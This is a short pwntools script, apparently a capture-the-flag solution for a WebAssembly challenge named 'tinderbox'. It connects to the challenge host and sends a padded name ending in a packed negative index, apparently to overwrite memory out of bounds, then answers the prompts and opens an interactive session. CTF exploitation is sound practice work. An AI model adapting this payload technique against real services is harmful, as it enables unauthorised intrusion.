from pwn import *
import struct

#sh = process(['wasmtime', './tinderbox.wasm'])

sh = remote('tinderbox.insomnihack.ch', 7171)
index = -12
sh.sendlineafter(b'Tell me your name:', b'AAAABBBBCCCCDDDD' + struct.pack('<i', index))

sh.sendlineafter(b'Tell me a joke!', b'1')
sh.sendlineafter(b'What value do you want there?', b'2')

sh.sendlineafter(b'Tell me a joke!', b'3')
#sh.sendlineafter(b'Give me a number', b'0')

sh.interactive()
